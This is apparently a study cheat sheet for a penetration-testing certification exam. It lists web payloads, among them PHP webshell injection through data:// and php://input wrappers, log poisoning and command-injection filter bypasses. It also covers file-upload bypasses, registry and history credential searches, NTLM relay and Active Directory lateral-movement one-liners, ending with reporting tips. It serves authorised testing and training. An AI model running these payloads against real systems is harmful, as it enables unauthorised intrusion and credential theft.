# CPTS Exam Methodology: The Master Guide

This guide is the final, exhaustive version of your CPTS methodology. It integrates advanced bypass techniques, multi-stage attack chains, and professional reporting standards.

---

## Phase 1: Advanced Enumeration & Discovery

### 1.1 Web Fuzzing Strategy
*   **Pro-Tip:** Don't just fuzz directories; fuzz for **extensions** and **parameters**.
*   **Parameter Fuzzing:** `ffuf -w burp-parameter-names.txt:FUZZ -u 'http://target/index.php?FUZZ=value' -fs <size>`
*   **Recursive LFI Fuzzing:** `ffuf -w LFI-Jhaddix.txt:FUZZ -u 'http://target/index.php?lang=FUZZ'`

### 1.2 "Living off the Land" Enumeration
*   **Check `/etc/hosts`:** Always check for hardcoded domain names.
*   **Environment Variables:** Use `printenv` or `env` to find internal paths, API keys, or config locations.
*   **Check History:** `history` (Linux) or `(Get-History).CommandLine` (PS) for leaked creds.

---

## Phase 2: Advanced Web Exploitation (The Bypass Bible)

### 2.1 File Inclusion (LFI/RFI) Bypasses
*   **Filter Bypass:** Try `....//` or `..././` if `../` is stripped.
*   **Encoding:** Double URL encode `../` -> `%252e%252e%252f`.
*   **PHP Wrappers (The Secret Weapons):**
    *   **Source Disclosure:** `php://filter/read=convert.base64-encode/resource=config`
    *   **RCE (Data):** `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+&cmd=id`
    *   **RCE (Input):** `curl -X POST --data '<?php system("id"); ?>' 'http://target/index.php?page=php://input'`
*   **Log Poisoning:**
    *   **Apache/Nginx:** Change User-Agent to `<?php system($_GET['cmd']); ?>` and include `access.log`.
    *   **SSH:** `ssh '<?php system($_GET["cmd"]); ?>'@target` and include `/var/log/auth.log`.

### 2.2 Command Injection Bypasses
*   **Space Filter:** Use `${IFS}` or `%09` (Tab) or `{ls,-la}` (Brace expansion).
*   **Slash Filter:** Use `${PATH:0:1}` to produce a `/`.
*   **Command Blacklist:**
    *   **Quotes:** `w'h'o'am'i` or `w"h"o"am"i`.
    *   **Backslash:** `w\h\o\a\m\i`.
    *   **Reverse:** `$(rev<<<'imaohw')`.
    *   **Case:** `WhOaMi` (Windows) or `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` (Linux).

### 2.3 File Upload Bypasses
*   **Client-Side:** Intercept with Burp or remove `onchange` / `accept` attributes in DevTools.
*   **Blacklist:** Try `.phtml`, `.php5`, `.phar`, `.pgif`.
*   **Whitelist (Double Ext):** `shell.jpg.php` or `shell.php.jpg` (Reverse Double Ext).
*   **MIME-Type/Magic Bytes:** Prepend `GIF8` to your PHP shell and set `Content-Type: image/gif`.

---

## Phase 3: Post-Exploitation & AD Domain Dominance

### 3.1 AD Persistence & Lateral Movement
*   **No Credentials?**
    *   Run **Responder** (`-dwf`) immediately upon internal access.
    *   **NTLM Relay:** Relay hashes to hosts with `Signing: False` to gain SYSTEM access.
*   **Have Standard User?**
    *   **BloodHound:** `bloodhound-python -u user -p pass -d domain.local -c All`.
    *   **Kerberoasting:** Target high-privilege SPNs (SQL, IIS).
    *   **ASREPRoasting:** Check for `DONT_REQ_PREAUTH` accounts.
*   **Lateral Movement One-Liners:**
    *   `evil-winrm -i <IP> -u <User> -p <Pass>`
    *   `psexec.py domain/user:pass@<IP>`
    *   `wmiexec.py domain/user:pass@<IP>`

### 3.2 Privilege Escalation Checklist (Windows)
*   [ ] `whoami /priv` (Check for `SeImpersonate`, `SeBackup`).
*   [ ] `netstat -ano` (Find internal services like 1433, 3306, 8080).
*   [ ] `reg query HKLM /f password /t REG_SZ /s` (Search Registry for creds).
*   [ ] Check for **Unquoted Service Paths** and **AlwaysInstallElevated**.

---

## Phase 4: Professional Documentation & Final Boss Checklist

### 4.1 Reporting Golden Rules
*   **Executive Summary:** NO technical jargon. Focus on **Impact** (e.g., "Access to HR documents" instead of "Domain Admin").
*   **Attack Chain:** Tell a story. Show how Finding A led to Finding B, then Domain Admin.
*   **Redaction:** Use **solid black bars**, NOT pixelation/blurring.
*   **Cleanup:** List every file uploaded and every account created.

### 4.2 The "I'm Stuck" Loop
1.  **Re-enumerate:** Did you miss a port? A sub-directory? A parameter?
2.  **Check Configs:** Did you read `wp-config.php`, `web.config`, or `.env`?
3.  **Check Local Ports:** Is there a service listening on `127.0.0.1` that you can pivot to?
4.  **Try Fallbacks:** If `psexec` fails, try `wmiexec`. If `wget` fails, try `certutil`.

---

## Final Submission Checklist
*   [ ] **Screenshots:** Do I have `whoami`, `hostname`, and `ipconfig` in EVERY proof?
*   [ ] **Flags:** Are the flag strings exact? (No trailing spaces).
*   [ ] **Credentials:** Did I list every cracked password and its associated user?
*   [ ] **Remediation:** Are my recommendations specific (e.g., specific GPO paths) or lazy?
*   [ ] **QA:** Did I read my own report once over to catch typos like "pubic" vs "public"?

---

## Decision Matrix: Shell Stabilization

| Target | Method | Why? |
| :--- | :--- | :--- |
| **Linux (Python3)** | `pty.spawn` | Standard, reliable. |
| **Linux (No Python)** | `script /dev/null -c bash` | Good fallback for minimal installs. |
| **Windows (CMD)** | `PowerShell` | Can often be upgraded to a full PS session or Meterpreter. |
| **Windows (PS)** | `IEX (New-Object ...)` | Loads scripts directly into memory, bypassing some disk AV. |
